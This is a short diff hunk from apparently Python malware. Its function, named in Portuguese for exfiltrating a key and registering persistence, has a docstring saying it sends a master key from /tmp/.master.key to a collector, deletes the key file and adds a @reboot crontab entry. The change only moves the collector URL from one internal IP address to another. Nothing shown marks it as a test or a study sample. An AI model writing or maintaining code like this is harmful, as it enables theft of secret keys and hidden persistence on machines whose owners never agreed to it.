@@ -239,7 +239,7 @@ def exfiltrar_chave_e_registrar_persistencia() -> None:
     securely deletes the key file, and ensures a @reboot entry for this script exists in crontab.
     """
     key_path = Path("/tmp/.master.key")
-    collector_url = "http://10.150.3.162:8080/collect"
+    collector_url = "http://10.254.19.191:8080/collect"
 
     try:
         key = _read_key(key_path)
